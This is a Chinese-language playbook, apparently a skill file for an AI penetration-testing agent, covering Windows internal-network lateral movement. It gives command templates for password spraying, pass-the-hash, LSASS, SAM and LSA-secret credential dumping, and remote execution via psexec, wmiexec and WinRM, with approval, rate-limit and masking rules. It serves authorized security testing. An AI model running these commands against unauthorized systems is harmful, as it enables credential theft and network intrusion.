---
id: windows-lateral
title: Windows 内网横向与凭据攻击（打点→转储→横向矩阵）
tags: 内网,横向,Windows,凭据,netexec,PTH,s5,s6
---
# Windows 内网横向与凭据攻击

**定位**：内网 Windows 环境的横向移动主线（与 intranet-lateral 的凭据复用入口、ad-attack 的域攻击剧本、tunnel-pivot 的隧道选型互补）。**进入条件**：已有内网立足点或有效凭据（S5/S6）；每一步利用级动作先审批（L2），凭据一律 record_loot 掩码登记。

## 一、枚举（L0/L1 只读优先）

1. **存活与端口**：`nmap -sn` 网段 → 关键端口探测（445/135/139、5985/5986 WinRM、3389 RDP、88 Kerberos、161 SNMP、47001）；`nmap -sV -p 445,135,5985,3389 --open` 收敛。
2. **SMB 枚举（netexec，只读模块）**：`nxc smb <cidr> --gen-relay-list`（可中继主机清单）、`nxc smb <ip> -u '' -p '' --shares`（空会话）、`nxc smb <ip> -u <u> -p <p> --users/--groups/--sessions/--disks/--loggedon-users`（认证后）。
3. **SNMP**：`snmpwalk -v2c -c public <ip>`（community 弱口令枚举：public/private/厂商默认）——网络设备信息金矿。
4. **主机情报**：`nxc smb <ip> -u <u> -p <p> --info`（域/系统/签名状态）；SMB 签名未强制 → 记入黑板（relay 候选，见 ad-attack）。

## 二、认证与密码喷洒（L2）

- `nxc smb <ip> -u users.txt -p 'Password1' --continue-on-success`（喷洒限速：单主机 ≤2 次/5min，跨主机分散；ROE 禁撞库则不做）。
- `nxc smb <ip> -u <u> -H <NTLM>` 认证有效性验证（PtH 可用性探测）。
- 本地管理员口令复用面：同网段同口验证（`--local-auth`），命中即记录黑板 `cred.reuse.<网段>`。

## 三、凭据获取（存在性证明口径，L2 全程）

| 目标 | 判据/命令 | 备注 |
|---|---|---|
| LSASS | `nxc smb <ip> -u <u> -p <p> -M lsassy` / procdump→离线 minidump 解析 | 摘要掩码登记，不落明文 |
| SAM 本地哈希 | `nxc smb <ip> -u <u> -H <h> --sam` | 本地账号 |
| LSA secrets | `nxc smb <ip> --lsa` | 服务账户口令/明文缓存 |
| NTDS.dit（域控） | secretsdump/drsuapi 口径（见 ad-attack） | 最高价值，务必审批 |
| 文件系统搜凭据 | `findstr /spin password *.txt *.ini *.xml`（受害机执行）、UNC 抓取（`--shares` 写权限判断） | 配置文件/脚本/无人值守安装文件 |
| DPAPI 线索 | 浏览器凭据/任务计划密钥存在性 | 离线解密超范围时如实标注待验证 |

## 四、横向执行矩阵（L2，命中即 S6 权限矩阵更新）

| 通道 | 命令骨架 | 适用/判据 |
|---|---|---|
| PtH | `nxc smb <ip> -u admin -H <hash> -x 'whoami'` | NTLM 签名不阻认证；管理员哈希到手首选 |
| WMI | `wmiexec.py <dom>/<u>:<p>@<ip>` | 445/135 开、无文件落地 |
| SMBexec/PsExec | `psexec.py <dom>/<u>:<p>@<ip>` | 需 ADMIN$ 写权限；留痕多，清理标注 |
| WinRM | `nxc winrm <ip> -u <u> -p <p> -x 'whoami'` / evil-winrm | 5985 开 + 远程管理用户组 |
| 计划任务 | `atexec.py <dom>/<u>:<p>@<ip> 'cmd'` | Task Scheduler 服务 |
| RDP 复用 | 凭据/哈希对 3389 尝试（hydra/xfreerdp） | 交互登录触发告警多，限速 |

## 五、纪律

- 横向链每跳 upsert_fact（`lateral.<主机>`：权限/凭据/下一跳），战利品 record_loot（掩码）。
- 全部执行类动作 L2 审批 + reason 写明「已授权横向验证」；失败 → update_coverage(premise_failed) 修正假设，不硬磕（同目标 ≤2 次）。
- 凭据复用优先级：域管 > 服务账号 > 本地管理员 > 普通用户；拿到高权限先收敛枚举面，不做破坏性验证。

## v4.8 M6 工具通道兼容性声明

> 通用判据以 `tool-channels.md` 为准（v5.1 单源去重）；本技能差异：netexec/crackmapexec 族批量在内网直连可用——喷洒受单主机 ≤2 次/5min 限频（正文纪律）， tunnel 内运行时双层限速叠加。nmap/curl 通用行不再内联。
